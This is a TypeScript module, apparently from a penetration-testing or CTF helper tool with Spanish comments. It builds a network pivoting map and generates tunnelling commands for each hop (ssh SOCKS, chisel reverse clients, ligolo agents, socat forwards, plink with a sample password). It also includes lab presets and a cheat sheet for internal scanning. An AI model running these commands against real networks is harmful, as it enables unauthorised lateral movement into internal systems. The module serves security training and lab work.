/* Pivoting Map v2: grafo de pivoting completo — nodos con interfaces y SO,
   enlaces por protocolo (ssh/chisel/ligolo/socat/plink/sshuttle/manual) con
   puertos editables, validación del grafo, rutas BFS y generación de comandos
   por tramo con "dónde se ejecuta cada cosa". */

export type PivotRole = 'atacante' | 'pivot' | 'objetivo'
export type PivotOs = 'linux' | 'windows'
export type PivotProto = 'ssh' | 'chisel' | 'ligolo' | 'socat' | 'plink' | 'sshuttle' | 'manual'

export interface PivotIface {
  cidr: string
  label?: string // eth0, tun0...
}

export interface PivotNode {
  id: string
  name: string
  role: PivotRole
  os: PivotOs
  x: number
  y: number
  ifaces: PivotIface[]
  note?: string
}

export interface PivotEdge {
  id: string
  from: string
  to: string
  proto: PivotProto
  alive: boolean
  localPort?: number // puerto SOCKS o escucha local en el atacante
  remotePort?: number // puerto destino para forwards puntuales
}

export interface PivotGraph {
  nodes: PivotNode[]
  edges: PivotEdge[]
  targetId: string
}

/* ── Catálogo de protocolos ── */

export interface ProtoInfo {
  label: string
  color: string
  needAttacker: string
  needPivot: string
  proxychains: boolean
  note: string
}

export const PROTO_INFO: Record<PivotProto, ProtoInfo> = {
  ssh: { label: 'SSH -D', color: '#38bdf8', needAttacker: 'cliente ssh (ya lo tienes)', needPivot: 'sshd activo + credenciales', proxychains: true, note: 'SOCKS5 dinámico cifrado. La primera opción a probar: no sube binarios.' },
  chisel: { label: 'Chisel', color: '#a78bfa', needAttacker: 'chisel server', needPivot: 'chisel client', proxychains: true, note: 'SOCKS5 por HTTP; atraviesa proxys y es el estándar CTF. --reverse = el pivote conecta hacia ti.' },
  ligolo: { label: 'Ligolo-ng', color: '#2ee88a', needAttacker: 'ligolo proxy (TUN)', needPivot: 'ligolo agent', proxychains: false, note: 'Crea una interfaz real: nmap/proxychains sin configurar nada. El más cómodo si puedes subir binarios.' },
  socat: { label: 'socat', color: '#f59e0b', needAttacker: 'nada', needPivot: 'binario socat', proxychains: false, note: 'Port-forward puntual, no SOCKS. Perfecto para exponer UN puerto (SMB, RDP, shell).' },
  plink: { label: 'plink (Win)', color: '#f43f5e', needAttacker: 'sshd a la escucha', needPivot: 'plink.exe', proxychains: true, note: 'SSH portable para pivotes Windows sin OpenSSH. Sube plink.exe (0.4 MB) y lanza el túnel.' },
  sshuttle: { label: 'sshuttle', color: '#22d3ee', needAttacker: 'sshuttle (pip)', needPivot: 'solo sshd + python3', proxychains: false, note: '"VPN pobre": ruta real en tu tabla de rutas, sin cliente en el pivote. No encadena bien multi-salto.' },
  manual: { label: 'Manual/otro', color: '#64748b', needAttacker: '—', needPivot: '—', proxychains: false, note: 'Enlace sin comandos automáticos: documenta a mano qué usaste (p. ej. webshell, tunnel tipo ICMP).' },
}

export const PROTO_ORDER: PivotProto[] = ['ssh', 'chisel', 'ligolo', 'socat', 'plink', 'sshuttle', 'manual']

/* ── Utilidades de red ── */

export function ifaceNet(cidr: string): string {
  const [ip, bits] = cidr.split('/')
  if (!ip || !bits) return cidr
  const p = ip.split('.').slice(0, Math.ceil(parseInt(bits) / 8)).join('.')
  return `${p}.0/${bits}`
}

export function ipOf(cidr: string): string {
  return cidr.split('/')[0] ?? cidr
}

/** Primera red compartida entre dos nodos (tramo directo posible). */
export function sharedNet(a: PivotNode, b: PivotNode): string | null {
  const netsA = a.ifaces.map((i) => ifaceNet(i.cidr))
  const netsB = b.ifaces.map((i) => ifaceNet(i.cidr))
  for (const na of netsA) if (netsB.includes(na)) return na
  return null
}

/** IP del nodo en la red compartida con el otro extremo del enlace. */
export function ipInNet(node: PivotNode, net: string | null): string | null {
  if (!net) return null
  for (const i of node.ifaces) if (ifaceNet(i.cidr) === net) return ipOf(i.cidr)
  return null
}

/* ── Validación del grafo ── */

export interface GraphIssue {
  level: 'error' | 'warn'
  msg: string
}

export function validateGraph(nodes: PivotNode[], edges: PivotEdge[]): GraphIssue[] {
  const issues: GraphIssue[] = []
  const attackers = nodes.filter((n) => n.role === 'atacante')
  if (attackers.length !== 1) issues.push({ level: 'error', msg: `Debe haber exactamente 1 nodo atacante (hay ${attackers.length}).` })

  const ids = new Set(nodes.map((n) => n.id))
  for (const e of edges) {
    if (!ids.has(e.from) || !ids.has(e.to)) { issues.push({ level: 'error', msg: `Enlace huérfano hacia nodo inexistente.` }); continue }
    if (e.from === e.to) issues.push({ level: 'error', msg: `Enlace de un nodo a sí mismo.` })
  }

  const nameCount = new Map<string, number>()
  for (const n of nodes) nameCount.set(n.name, (nameCount.get(n.name) ?? 0) + 1)
  for (const [name, c] of nameCount) if (c > 1) issues.push({ level: 'warn', msg: `Nombre duplicado: "${name}" — los comandos pueden ser ambiguos.` })

  // interfaces duplicadas en la misma red dentro de un nodo
  for (const n of nodes) {
    const nets = n.ifaces.map((i) => ifaceNet(i.cidr))
    const dup = nets.filter((x, i) => nets.indexOf(x) !== i)
    if (dup.length) issues.push({ level: 'warn', msg: `${n.name}: varias interfaces en la misma red (${dup[0]}).` })
  }

  // enlaces que no comparten red (excepto el que arranca del atacante)
  const alive = edges.filter((e) => e.alive)
  for (const e of alive) {
    const a = nodes.find((n) => n.id === e.from), b = nodes.find((n) => n.id === e.to)
    if (!a || !b) continue
    if (a.role !== 'atacante' && b.role !== 'atacante' && !sharedNet(a, b)) {
      issues.push({ level: 'warn', msg: `"${a.name}" ↔ "${b.name}": ninguna interfaz comparte red — este salto es raro (¿túnel Wan? revísalo).` })
    }
    if (e.proto === 'plink' && a.os !== 'windows' && b.os !== 'windows') {
      issues.push({ level: 'warn', msg: `plink en un enlace Linux↔Linux: usa ssh normal.` })
    }
  }

  // nodos inalcanzables
  const routes = computeRoutes(nodes, edges)
  for (const n of nodes) if (n.id !== attackers[0]?.id && !routes.has(n.id)) {
    issues.push({ level: 'error', msg: `"${n.name}" es inalcanzable: falta un enlace vivo desde el atacante.` })
  }
  return issues
}

/* ── Rutas (BFS por enlaces vivos) ── */

export interface RouteHop {
  node: PivotNode
  edge: PivotEdge | null // edge usado para LLEGAR aquí
}

export function computeRoutes(nodes: PivotNode[], edges: PivotEdge[]): Map<string, RouteHop[]> {
  const attacker = nodes.find((n) => n.role === 'atacante')
  const routes = new Map<string, RouteHop[]>()
  if (!attacker) return routes
  const adj = new Map<string, { to: PivotNode; edge: PivotEdge }[]>()
  for (const e of edges) {
    if (!e.alive) continue
    const a = nodes.find((n) => n.id === e.from), b = nodes.find((n) => n.id === e.to)
    if (!a || !b) continue
    if (!adj.has(e.from)) adj.set(e.from, [])
    if (!adj.has(e.to)) adj.set(e.to, [])
    adj.get(e.from)!.push({ to: b, edge: e })
    adj.get(e.to)!.push({ to: a, edge: e })
  }
  const visited = new Set<string>([attacker.id])
  const queue: RouteHop[][] = [[{ node: attacker, edge: null }]]
  routes.set(attacker.id, queue[0])
  while (queue.length) {
    const path = queue.shift()!
    const last = path[path.length - 1].node
    for (const { to, edge } of adj.get(last.id) ?? []) {
      if (visited.has(to.id)) continue
      visited.add(to.id)
      const next = [...path, { node: to, edge }]
      routes.set(to.id, next)
      queue.push(next)
    }
  }
  return routes
}

/* ── Generación de comandos ── */

export interface PivotStep {
  cmd: string
  why: string
  where: string // nombre del nodo donde se ejecuta
}

const SOCKS_BASE = 1080

export function buildPivotSteps(nodes: PivotNode[], route: RouteHop[], opts: { chiselPort: number; attackerAddr: string }): PivotStep[] {
  const steps: PivotStep[] = []
  const find = (id: string) => nodes.find((n) => n.id === id)!
  const socksPorts: string[] = []

  for (let i = 1; i < route.length; i++) {
    const hop = route[i]
    const prev = route[i - 1].node
    const node = hop.node
    const edge = hop.edge!
    const proto = edge.proto
    const info = PROTO_INFO[proto]
    const socksPort = edge.localPort ?? SOCKS_BASE + (socksPorts.length ? socksPorts.length : 0)
    socksPorts.push(String(socksPort))
    const throughPrev = i >= 2 // ¿hay que meter este salto dentro del túnel anterior?
    const pcPrefix = throughPrev && info.proxychains ? 'proxychains -q ' : ''

    // IP del pivote en la red compartida con el nodo anterior
    const net = sharedNet(prev, node)
    const pivotIp = ipInNet(node, net) ?? ipOf(node.ifaces[0]?.cidr ?? '')

    if (proto === 'ssh') {
      steps.push({ where: 'atacante', cmd: `ssh -D ${socksPort} -N -f usuario@${pivotIp}`, why: `SOCKS5 dinámico en :${socksPort} que "sale" en ${node.name}. -N no ejecuta nada remoto, -f lo manda al fondo.` })
      if (throughPrev) steps.push({ where: 'atacante', cmd: `# alternativa encadenada: ssh -J usuario@${route[i - 2]?.node.name ?? 'pivote'} usuario@${pivotIp}`, why: 'ProxyJump enciende el salto previo automáticamente; prueba esto antes de apilar túneles a mano.' })
      steps.push({ where: 'atacante', cmd: `sed -i 's/socks4/socks5/' /etc/proxychains4.conf && echo 'socks5 127.0.0.1 ${socksPort}' >> /etc/proxychains4.conf`, why: `apunta proxychains al SOCKS de este tramo (una sola vez por puerto).` })
    } else if (proto === 'chisel') {
      if (i === 1) {
        steps.push({ where: 'atacante', cmd: `chisel server --port ${opts.chiselPort} --reverse`, why: 'tu máquina hace de servidor chisel: los pivotes conectan hacia ti (útil con NAT).' })
        steps.push({ where: node.name, cmd: `chisel client ${opts.attackerAddr}:${opts.chiselPort} R:socks`, why: `abre un SOCKS5 en TU :${socksPort} cuyo tráfico sale en ${node.name}.` })
      } else {
        steps.push({ where: node.name, cmd: `${pcPrefix}chisel client ${opts.attackerAddr}:${opts.chiselPort} R:${socksPort}:socks`, why: `encadena un segundo SOCKS en TU :${socksPort}; con proxychains el cliente chisel alcanza tu servidor a través del túnel previo.` })
      }
    } else if (proto === 'ligolo') {
      if (i === 1) {
        steps.push({ where: 'atacante', cmd: `ligolo-proxy -selfcert`, why: 'levanta la TUN del proxy (cert autofirmado; el agent conectará con -ignore-cert).' })
        steps.push({ where: node.name, cmd: `./agent -connect ${opts.attackerAddr}:11601 -ignore-cert`, why: `el agent ${node.name} se conecta a tu proxy; en la sesión: iface y route_add para enrutar su red.` })
        const nets = node.ifaces.map((f) => ifaceNet(f.cidr)).filter((n) => n !== ifaceNet(prev.ifaces[0]?.cidr ?? ''))
        if (nets.length) steps.push({ where: 'atacante (sesión ligolo)', cmd: `route_add --route ${nets[0]} --name 0`, why: `añade ${nets[0]} a tu tabla: ahora nmap/smbclient funcionan DIRECTOS, sin proxychains.` })
      } else {
        steps.push({ where: node.name, cmd: `./agent -connect 127.0.0.1:11601 -ignore-cert &`, why: `agent encadenado: lanza un listener en el pivote previo y redirige 11601 hacia tu proxy (socat TCP-LISTEN:11601,fork TCP:${opts.attackerAddr}:11601).` })
      }
      const netsN = node.ifaces.map((f) => ifaceNet(f.cidr)).filter((n) => n !== ifaceNet(prev.ifaces[0]?.cidr ?? ''))
      if (netsN.length) steps.push({ where: 'atacante (sesión ligolo)', cmd: `route_add --route ${netsN[0]} --name 0`, why: `enruta ${netsN[0]} a través del agent de ${node.name}; desde la sesión del proxy: session → ${node.name}.` })
    } else if (proto === 'socat') {
      const lport = edge.localPort ?? 9000 + i
      const targetIp = ipOf(node.ifaces[0]?.cidr ?? 'IP_SIGUIENTE')
      const rport = edge.remotePort ?? 445
      // IP por la que el atacante alcanza al pivote previo (la red compartida con el salto anterior)
      const reachIp = throughPrev ? ipInNet(prev, sharedNet(route[i - 2]?.node, prev)) ?? ipOf(prev.ifaces[0]?.cidr ?? prev.name) : ipOf(prev.ifaces[0]?.cidr ?? prev.name)
      const socatPc = throughPrev ? 'proxychains -q ' : '' // el puerto del pivote solo se alcanza a través del túnel anterior
      steps.push({ where: prev.name, cmd: `socat TCP-LISTEN:${lport},fork,reuseaddr TCP:${targetIp}:${rport}`, why: `en el pivote ${prev.name}: expone ${targetIp}:${rport} como si estuviera en ${prev.name}:${lport}.` })
      steps.push({ where: 'atacante', cmd: `${socatPc}smbclient -L //${reachIp} -p ${lport}`, why: `verifica el forward alcanzando el puerto reenviado (cámbialo por el cliente del servicio).` })
    } else if (proto === 'plink') {
      steps.push({ where: node.name + ' (Win)', cmd: `plink.exe -ssh ${opts.attackerAddr.split(':')[0] ?? opts.attackerAddr} -l usuario -pw Passw0rd! -D ${socksPort} -N -batch`, why: `plink = ssh portable de Windows: SOCKS5 en TU :${socksPort} saliendo en ${node.name}. Requiere sshd en tu máquina (service ssh start).` })
      steps.push({ where: 'atacante', cmd: `sed -i 's/socks4/socks5/' /etc/proxychains4.conf && echo 'socks5 127.0.0.1 ${socksPort}' >> /etc/proxychains4.conf`, why: `proxychains apunta al nuevo SOCKS.` })
    } else if (proto === 'sshuttle') {
      const nets = node.ifaces.map((f) => ifaceNet(f.cidr)).filter((n) => !ifaceNet(prev.ifaces[0]?.cidr ?? '').includes(n))
      steps.push({ where: 'atacante', cmd: `sshuttle -r usuario@${pivotIp} ${nets[0] ?? '10.10.10.0/24'} --dns`, why: 'ruta REAL en tu kernel hacia la red del pivote (sin proxychains). Solo necesita sshd+python3 en el pivote.' })
      if (throughPrev) steps.push({ where: 'atacante', cmd: `# ojo: sshuttle no encadena bien multi-salto`, why: 'para redes tras otro túnel, envuelve sshuttle dentro de proxychains o usa ligolo encadenado.' })
    } else {
      steps.push({ where: '—', cmd: `# (manual) ${node.name}: documenta aquí cómo conectas con ${prev.name}`, why: 'webshell, túnel ICMP/DNS, pivote por RDP… lo que sea; el mapa queda como documentación.' })
    }
  }

  return steps
}

/** Comando de verificación final según el último proto usado en la ruta. */
export function verifyCommand(route: RouteHop[]): string {
  const last = route[route.length - 1]?.edge?.proto
  if (last === 'ligolo' || last === 'sshuttle') return `nmap -sT -Pn --top-ports 100 <IP_interna>   # sin proxychains: la ruta es real`
  const ports = route.slice(1).map((h) => h.edge?.localPort ?? 1080)
  const p = ports[ports.length - 1] ?? 1080
  return `proxychains -q nmap -sT -Pn --top-ports 100 <IP_interna>   # a través del SOCKS :${p}`
}

/* ── Presets ── */

export const PRESETS: { id: string; name: string; desc: string; graph: PivotGraph }[] = [
  {
    id: 'dmz',
    name: 'DMZ clásico',
    desc: 'kali → web-dmz (shell inicial) → fileserver en LAN interna',
    graph: {
      nodes: [
        { id: 'kali', name: 'kali', role: 'atacante', os: 'linux', x: 70, y: 180, ifaces: [{ cidr: '10.10.14.5/24', label: 'vpn0' }] },
        { id: 'dmz', name: 'web-dmz', role: 'pivot', os: 'linux', x: 340, y: 180, ifaces: [{ cidr: '10.10.14.20/24', label: 'eth0' }, { cidr: '10.10.10.5/24', label: 'eth1' }], note: 'shell inicial' },
        { id: 'fs', name: 'fileserver', role: 'objetivo', os: 'linux', x: 610, y: 180, ifaces: [{ cidr: '10.10.10.15/24', label: 'eth0' }], note: 'solo desde la DMZ' },
      ],
      edges: [
        { id: 'e1', from: 'kali', to: 'dmz', proto: 'ssh', alive: true, localPort: 1080 },
        { id: 'e2', from: 'dmz', to: 'fs', proto: 'chisel', alive: true, localPort: 1081 },
      ],
      targetId: 'fs',
    },
  },
  {
    id: 'double',
    name: 'Doble pivote',
    desc: 'tres saltos: DMZ → core router → red de gestión',
    graph: {
      nodes: [
        { id: 'kali', name: 'kali', role: 'atacante', os: 'linux', x: 60, y: 300, ifaces: [{ cidr: '10.10.14.5/24', label: 'vpn0' }] },
        { id: 'dmz', name: 'web-dmz', role: 'pivot', os: 'linux', x: 300, y: 160, ifaces: [{ cidr: '10.10.14.20/24' }, { cidr: '10.10.10.5/24' }], note: 'foothold' },
        { id: 'core', name: 'core-sw', role: 'pivot', os: 'linux', x: 560, y: 300, ifaces: [{ cidr: '10.10.10.30/24' }, { cidr: '172.16.5.4/24' }], note: 'salto 2' },
        { id: 'mgmt', name: 'dc-mgmt', role: 'objetivo', os: 'windows', x: 800, y: 170, ifaces: [{ cidr: '172.16.5.10/24' }], note: 'DC 172.16.5.0/24' },
      ],
      edges: [
        { id: 'e1', from: 'kali', to: 'dmz', proto: 'chisel', alive: true, localPort: 1080 },
        { id: 'e2', from: 'dmz', to: 'core', proto: 'ligolo', alive: true, localPort: 1081 },
        { id: 'e3', from: 'core', to: 'mgmt', proto: 'socat', alive: true, localPort: 9443, remotePort: 5985 },
      ],
      targetId: 'mgmt',
    },
  },
  {
    id: 'win',
    name: 'Pivote Windows',
    desc: 'foothold Windows con plink y objetivo RDP en red interna',
    graph: {
      nodes: [
        { id: 'kali', name: 'kali', role: 'atacante', os: 'linux', x: 70, y: 200, ifaces: [{ cidr: '10.10.14.5/24', label: 'vpn0' }] },
        { id: 'win', name: 'win-dmz', role: 'pivot', os: 'windows', x: 340, y: 200, ifaces: [{ cidr: '10.10.14.40/24' }, { cidr: '10.10.100.8/24' }], note: 'webshell IIS' },
        { id: 'sql', name: 'sql-internal', role: 'objetivo', os: 'windows', x: 620, y: 200, ifaces: [{ cidr: '10.10.100.50/24' }], note: 'MSSQL 1433' },
      ],
      edges: [
        { id: 'e1', from: 'kali', to: 'win', proto: 'plink', alive: true, localPort: 1080 },
        { id: 'e2', from: 'win', to: 'sql', proto: 'socat', alive: true, localPort: 9143, remotePort: 1433 },
      ],
      targetId: 'sql',
    },
  },
  {
    id: 'ligolo',
    name: 'Ligolo directo',
    desc: 'un salto con ligolo: ruta real sin proxychains',
    graph: {
      nodes: [
        { id: 'kali', name: 'kali', role: 'atacante', os: 'linux', x: 90, y: 200, ifaces: [{ cidr: '10.10.14.5/24', label: 'vpn0' }] },
        { id: 'target', name: 'corp-host', role: 'pivot', os: 'linux', x: 400, y: 200, ifaces: [{ cidr: '10.10.14.60/24' }, { cidr: '192.168.50.4/24' }], note: 'agent ligolo' },
      ],
      edges: [{ id: 'e1', from: 'kali', to: 'target', proto: 'ligolo', alive: true }],
      targetId: 'target',
    },
  },
]

/* ── Chuleta y notas ── */

export const PIVOT_NOTES: string[] = [
  'Enumera SIEMPRE las interfaces del pivote: ip a (Linux) / ipconfig /all (Windows) revela la siguiente red.',
  'Orden de preferencia: ssh -J si hay SSH → ligolo si puedes subir binarios → chisel si hay proxy/web → socat para puertos puntuales.',
  'Cada SOCKS necesita su propio puerto: 1080, 1081, 1082… apúntalos; proxychains solo usa el del ÚLTIMO tramo.',
  'Ligolo no usa proxychains: crea una interfaz TUN real; route_add por cada red nueva dentro de la sesión del proxy.',
  'Con Windows targets: plink.exe equivale a ssh -D desde un binario portable; sshuttle requiere python3 en el pivote.',
  'Arrastra los nodos para reordenar el mapa y exporta el JSON para conservar el diagrama en el informe.',
]

export const PIVOT_CHEATSHEET: [string, string][] = [
  ['enumerar interfaces', 'ip a · ipconfig /all · hostname -I'],
  ['descubrir red vecina', 'nmap -sn 10.10.10.0/24 (desde el pivote) · for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i &) ; done; arp -a'],
  ['SOCKS con SSH', 'ssh -D 1080 -N -f user@pivote · encadenar: ssh -J user@p1 user@p2'],
  ['SOCKS con chisel', 'server: chisel server -p 8000 --reverse · client: chisel client IP:8000 R:socks'],
  ['ligolo', 'proxy: ligolo-proxy -selfcert · agent: ./agent -connect IP:11601 -ignore-cert → route_add'],
  ['port forward simple', 'socat TCP-LISTEN:3389,fork TCP:10.10.10.15:3389'],
  ['proxychains', 'proxychains -q nmap -sT -Pn 10.10.10.0/24 (socks5 127.0.0.1 1080 en la conf)'],
  ['sshuttle (mágico)', 'sshuttle -r user@pivote 10.10.10.0/24 — VPN sin instalar nada en el pivote'],
]
